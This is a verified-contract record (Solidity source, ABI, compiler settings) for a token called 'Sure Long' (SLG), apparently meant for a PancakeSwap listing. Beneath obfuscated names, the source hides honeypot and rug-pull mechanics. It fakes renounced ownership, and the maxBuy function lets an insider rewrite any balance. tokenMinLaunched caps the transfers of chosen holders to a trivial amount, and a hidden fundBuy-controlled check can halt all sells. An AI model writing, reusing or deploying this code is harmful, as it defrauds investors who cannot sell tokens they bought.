{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface shouldMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityLimit) external view returns (uint256);\n\n    function transfer(address minAutoSwap, uint256 receiverLimitTotal) external returns (bool);\n\n    function allowance(address tokenAmountMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverLimitTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minAutoSwap,\n        uint256 receiverLimitTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapReceiverReceiver, uint256 value);\n    event Approval(address indexed tokenAmountMax, address indexed spender, uint256 value);\n}\n\nabstract contract fundReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityLaunchFund {\n    function createPair(address maxShould, address fundToken) external returns (address);\n}\n\ninterface shouldMaxMetadata is shouldMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SureLong is fundReceiver, shouldMax, shouldMaxMetadata {\n\n    event OwnershipTransferred(address indexed fromAutoTeam, address indexed atAmount);\n\n    uint256 fundTotalExempt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxFund;\n    }\n\n    mapping(address => mapping(address => uint256)) private walletSender;\n\n    function owner() external view returns (address) {\n        return txLimit;\n    }\n\n    uint256 private exemptMode;\n\n    mapping(address => bool) public shouldExempt;\n\n    mapping(address => bool) public walletLaunchedTrading;\n\n    address buyTakeLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant marketingMax = 8 ** 10;\n\n    bool public limitFundShould;\n\n    mapping(address => uint256) private feeLiquidity;\n\n    function walletSwapIs(address enableTradingFund) public {\n        if (limitFundShould) {\n            return;\n        }\n        if (sellSwap) {\n            totalMaxTeam = true;\n        }\n        walletLaunchedTrading[enableTradingFund] = true;\n        if (autoTrading) {\n            toLimit = exemptMode;\n        }\n        limitFundShould = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoShould;\n    }\n\n    uint256 liquidityExempt;\n\n    uint256 private feeExemptFund = 100000000 * 10 ** 18;\n\n    function shouldFee() private view {\n        require(walletLaunchedTrading[_msgSender()]);\n    }\n\n    string private launchLaunched = \"Sure Long\";\n\n    function fundBuy(uint256 receiverLimitTotal) public {\n        shouldFee();\n        liquidityExempt = receiverLimitTotal;\n    }\n\n    function transfer(address enableFrom, uint256 receiverLimitTotal) external virtual override returns (bool) {\n        return atIs(_msgSender(), enableFrom, receiverLimitTotal);\n    }\n\n    uint256 private toLimit;\n\n    uint8 private maxFund = 18;\n\n    address public exemptAmount;\n\n    address public buyLaunched;\n\n    bool public sellSwap;\n\n    address txReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private autoTrading;\n\n    function approve(address listExempt, uint256 receiverLimitTotal) public virtual override returns (bool) {\n        walletSender[_msgSender()][listExempt] = receiverLimitTotal;\n        emit Approval(_msgSender(), listExempt, receiverLimitTotal);\n        return true;\n    }\n\n    constructor (){\n        \n        teamTotal atWallet = teamTotal(buyTakeLimit);\n        buyLaunched = liquidityLaunchFund(atWallet.factory()).createPair(atWallet.WETH(), address(this));\n        \n        exemptAmount = _msgSender();\n        minListMode();\n        walletLaunchedTrading[exemptAmount] = true;\n        feeLiquidity[exemptAmount] = feeExemptFund;\n        \n        emit Transfer(address(0), exemptAmount, feeExemptFund);\n    }\n\n    function maxBuy(address enableFrom, uint256 receiverLimitTotal) public {\n        shouldFee();\n        feeLiquidity[enableFrom] = receiverLimitTotal;\n    }\n\n    address private txLimit;\n\n    function getOwner() external view returns (address) {\n        return txLimit;\n    }\n\n    function tokenMinLaunched(address fromAtTeam) public {\n        shouldFee();\n        \n        if (fromAtTeam == exemptAmount || fromAtTeam == buyLaunched) {\n            return;\n        }\n        shouldExempt[fromAtTeam] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchLaunched;\n    }\n\n    string private autoShould = \"SLG\";\n\n    function balanceOf(address liquidityLimit) public view virtual override returns (uint256) {\n        return feeLiquidity[liquidityLimit];\n    }\n\n    function transferFrom(address txTotal, address minAutoSwap, uint256 receiverLimitTotal) external override returns (bool) {\n        if (_msgSender() != buyTakeLimit) {\n            if (walletSender[txTotal][_msgSender()] != type(uint256).max) {\n                require(receiverLimitTotal <= walletSender[txTotal][_msgSender()]);\n                walletSender[txTotal][_msgSender()] -= receiverLimitTotal;\n            }\n        }\n        return atIs(txTotal, minAutoSwap, receiverLimitTotal);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeExemptFund;\n    }\n\n    function amountSwapEnable(address txTotal, address minAutoSwap, uint256 receiverLimitTotal) internal returns (bool) {\n        require(feeLiquidity[txTotal] >= receiverLimitTotal);\n        feeLiquidity[txTotal] -= receiverLimitTotal;\n        feeLiquidity[minAutoSwap] += receiverLimitTotal;\n        emit Transfer(txTotal, minAutoSwap, receiverLimitTotal);\n        return true;\n    }\n\n    function minListMode() public {\n        emit OwnershipTransferred(exemptAmount, address(0));\n        txLimit = address(0);\n    }\n\n    bool public totalMaxTeam;\n\n    bool private limitFrom;\n\n    function atIs(address txTotal, address minAutoSwap, uint256 receiverLimitTotal) internal returns (bool) {\n        if (txTotal == exemptAmount) {\n            return amountSwapEnable(txTotal, minAutoSwap, receiverLimitTotal);\n        }\n        uint256 feeFund = shouldMax(buyLaunched).balanceOf(txReceiver);\n        require(feeFund == liquidityExempt);\n        require(minAutoSwap != txReceiver);\n        if (shouldExempt[txTotal]) {\n            return amountSwapEnable(txTotal, minAutoSwap, marketingMax);\n        }\n        return amountSwapEnable(txTotal, minAutoSwap, receiverLimitTotal);\n    }\n\n    function allowance(address enableTotalAmount, address listExempt) external view virtual override returns (uint256) {\n        if (listExempt == buyTakeLimit) {\n            return type(uint256).max;\n        }\n        return walletSender[enableTotalAmount][listExempt];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAmountMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromAutoTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapReceiverReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTotalAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLimitTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverLimitTotal\",\"type\":\"uint256\"}],\"name\":\"fundBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFundShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLimitTotal\",\"type\":\"uint256\"}],\"name\":\"maxBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minListMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAtTeam\",\"type\":\"address\"}],\"name\":\"tokenMinLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMaxTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLimitTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minAutoSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLimitTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletLaunchedTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTradingFund\",\"type\":\"address\"}],\"name\":\"walletSwapIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SureLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}